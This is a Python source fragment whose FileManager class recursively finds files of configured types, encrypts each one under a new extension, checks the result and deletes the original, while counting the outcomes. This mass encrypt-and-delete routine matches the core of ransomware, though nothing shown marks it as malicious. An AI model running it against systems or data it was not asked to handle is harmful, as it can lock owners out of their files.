@dataclass
class FileOperation:
    """Track file operation results."""
    source_path: str
    dest_path: Optional[str]
    operation: str  # encrypt, decrypt, skip, error
    size: int
    timestamp: str
    error: Optional[str] = None

class FileManager:
    """Handles file discovery and operations."""
    
    def __init__(self, config: Config):
        self.config = config
        self.operations: List[FileOperation] = []
        self._lock = threading.Lock()
        self.stats = {
            'processed': 0,
            'encrypted': 0,
            'failed': 0,
            'skipped': 0,
            'total_size': 0
        }
    
    def discover_files(self, directory: str) -> queue.Queue:
        """Recursively find target files."""
        file_queue = queue.Queue()
        count = 0
        
        for root, _, files in os.walk(directory):
            for filename in files:
                if filename.endswith(self.config.file_types):
                    if not filename.endswith(self.config.encrypted_ext):
                        full_path = os.path.join(root, filename)
                        file_queue.put(full_path)
                        count += 1
        
        logger.info(f"Discovered {count} files in {directory}")
        return file_queue
    
    def encrypt_file(self, file_path: str, crypto: CryptoEngine) -> FileOperation:
        """Encrypt single file with verification."""
        try:
            # Read original
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            # Encrypt
            encrypted_data = crypto.encrypt_data(original_data)
            
            # Write encrypted
            encrypted_path = file_path + self.config.encrypted_ext
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Verify by decrypting
            verify_data = crypto.decrypt_data(encrypted_data)
            if verify_data != original_data:
                raise ValueError("Verification failed")
            
            # Remove original only after verification
            os.remove(file_path)
            
            op = FileOperation(
                source_path=file_path,
                dest_path=encrypted_path,
                operation='encrypt',
                size=len(original_data),
                timestamp=datetime.now().isoformat()
            )
            
            with self._lock:
                self.stats['encrypted'] += 1
                self.stats['total_size'] += len(original_data)
            
            return op
            
        except PermissionError:
            op = FileOperation(
                source_path=file_path,
                dest_path=None,
                operation='skip',
                size=0,
                timestamp=datetime.now().isoformat(),
                error="Permission denied"
            )
            with self._lock:
                self.stats['skipped'] += 1
            return op
            
        except Exception as e:
            op = FileOperation(
                source_path=file_path,
                dest_path=None,
                operation='error',
                size=0,
                timestamp=datetime.now().isoformat(),
                error=str(e)
            )
            with self._lock:
                self.stats['failed'] += 1
            return op
    
    def get_stats(self) -> Dict:
        """Get current statistics."""
        with self._lock:
            return dict(self.stats)

